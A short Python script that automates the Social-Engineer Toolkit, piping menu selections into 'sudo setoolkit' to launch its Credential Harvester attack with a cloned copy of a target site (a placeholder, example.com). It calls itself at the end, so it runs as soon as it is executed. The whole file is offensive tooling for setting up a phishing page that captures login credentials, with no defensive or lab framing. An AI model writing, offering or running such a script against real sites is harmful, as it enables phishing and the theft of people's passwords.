import subprocess

def setup_credential_harvester():
    """
    Set up the Credential Harvester using SET.

    Returns:
    None
    """
    print("Setting up Credential Harvester...")
    commands = [
        "use social-engineering",
        "1",  # Social Engineering Attacks
        "2",  # Website Attack Vectors
        "3",  # Credential Harvester Attack Method
        "2",  # Site Cloner
        "http://example.com",  # URL to clone
        "run"
    ]
    subprocess.run(["sudo", "setoolkit"], input="\n".join(commands) + "\n", text=True)

# Example usage
setup_credential_harvester()
